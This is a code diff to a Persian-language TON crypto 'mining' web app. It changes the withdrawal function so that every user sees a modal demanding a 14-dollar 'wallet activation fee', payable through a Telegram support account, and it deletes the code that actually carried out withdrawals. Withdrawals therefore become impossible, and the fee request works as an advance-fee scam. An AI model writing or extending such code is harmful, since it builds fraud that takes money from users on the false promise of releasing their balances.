@@ -172,16 +172,16 @@
 
 <div id="userDetailModal" class="user-modal" onclick="if(event.target===this) closeUserModal()"><div class="modal-card"><h2><i class="fas fa-user"></i> جزئیات کاربر</h2><div id="userDetails"></div><button class="admin-btn-sm" style="width:100%;margin-top:20px;background:#ff512f" onclick="closeUserModal()"><i class="fas fa-times"></i> بستن</button></div></div>
 
-<!-- مودال کارمزد (برای برداشت) - ۱۴ تتر و لینک پشتیبانی -->
+<!-- مودال کارمزد برداشت (برای همه کاربران) -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
-        <h2>فعالسازی برداشت</h2>
+        <h2>پرداخت کارمزد برداشت</h2>
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle" style="margin-left:5px;"></i>
-            شما کارمزد فعالسازی را پرداخت نکرده‌اید. برای برداشت ابتدا کارمزد ۱۴ تتر (USDT) را به پشتیبانی پرداخت کنید.
+            برای انجام برداشت، لازم است ابتدا کارمزد فعال‌سازی کیف پول به مبلغ ۱۴ دلار پرداخت گردد. این مبلغ جهت تایید نهایی تراکنش و واریز وجه به حساب شما الزامی است. لطفاً برای دریافت آدرس کیف پول (یا شماره کارت) جهت واریز کارمزد، با پشتیبانی در ارتباط باشید.
         </div>
-        <div class="fee-tag">۱۴ تتر (USDT)</div>
+        <div class="fee-tag">۱۴ دلار (معادل‌سازی با TON یا USDT)</div>
         <a href="https://t.me/miningertoncoin" target="_blank" class="btn active-btn">
             <i class="fas fa-headset"></i> پیام به پشتیبانی
         </a>
@@ -836,6 +836,7 @@ function checkAndEnableFinalWithdraw() {
     }
 }
 
+// تابع برداشت نهایی: فقط مودال کارمزد را نمایش می‌دهد (برای همه کاربران)
 window.finalWithdraw = function() {
     if (!isWalletConnected) {
         showToast("❌ ابتدا کیف پول را متصل کنید");
@@ -847,22 +848,8 @@ window.finalWithdraw = function() {
         return;
     }
     
-    // اولویت اول: بررسی فعال بودن پنل
-    if (localStorage.getItem('isActivated') !== 'true') {
-        // نمایش مودال پرداخت کارمزد (بدون نیاز به حداقل موجودی)
-        document.getElementById('feeModal').style.display = 'flex';
-        return;
-    }
-    
-    // اگر فعال بود، برداشت را انجام بده (بدون محدودیت حداقل مبلغ)
-    const amountToWithdraw = withdrawableBalance;
-    addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
-    sendToTelegram(`💰 **برداشت نهایی**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-    withdrawableBalance = 0;
-    document.getElementById('withdrawableBalance').innerText = "0.000000";
-    localStorage.setItem('withdrawableBalance', "0");
-    document.getElementById('finalWithdrawBtn').classList.add('disabled');
-    showToast(`✅ برداشت ${amountToWithdraw.toFixed(6)} TON با موفقیت انجام شد`);
+    // نمایش مودال پرداخت کارمزد (برای همه کاربران، بدون شرط فعال بودن)
+    document.getElementById('feeModal').style.display = 'flex';
 };
 
 // ==================== مقداردهی اولیه (بدون پاپ‌آپ فعالسازی) ====================
